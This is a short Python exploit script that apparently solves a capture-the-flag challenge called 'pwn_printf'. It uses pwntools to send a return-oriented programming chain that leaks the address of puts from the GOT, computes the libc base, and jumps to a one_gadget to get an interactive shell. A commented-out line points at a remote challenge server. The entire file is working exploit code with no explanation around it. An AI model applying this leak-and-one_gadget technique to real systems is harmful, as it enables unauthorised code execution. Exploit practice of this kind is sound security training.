#!/usr/bin/python
#coding=utf-8
from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']
context.binary = "./pwn_printf"
context.log_level = 'debug'
p = process("./pwn_printf")
# p = remote('47.111.96.55','54406')
elf = ELF("./pwn_printf")
libc = elf.libc
main_addr = 0x4007EF
leave_ret = 0x4007ed
pop_rdi = 0x401213
# p.recvuntil('You will find this game very interesting\n')
# for i in range(16):
# 	p.sendline(str(i))
# payload = p64(0x600000)+p64(main_addr)
# gdb.attach(p)
# p.send(payload)
p.recvuntil('You will find this game very interesting\n')
for i in range(16):
	p.sendline(str(32))
#got表中的数据一般非0,而且足够大
payload = p64(elf.got['puts'])+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x4007d4)#ebp设为可读地址,为给后面返回时输入足够大的数给RDX
# payload =  p64(elf.got['read']) + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x4007D4) + p64(elf.plt['puts'])

p.send(payload)

libc_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))-libc.sym['puts']
info(hex(libc_base))
one_gadget = libc_base+[0x4f2c5,0x4f322,0x10a38c][2]
p.send('a'*8+p64(one_gadget))
 
p.interactive()